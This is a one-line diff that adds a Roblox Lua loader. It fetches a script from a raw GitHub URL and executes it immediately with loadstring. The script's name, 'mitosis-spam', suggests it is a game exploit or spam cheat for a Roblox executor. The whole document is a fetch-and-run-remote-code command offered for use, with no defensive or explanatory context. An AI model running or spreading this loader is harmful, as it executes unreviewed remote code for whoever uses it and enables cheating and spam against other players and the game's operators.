@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/mitosis-spam7-1rgted3qmcvkml.lua"))()
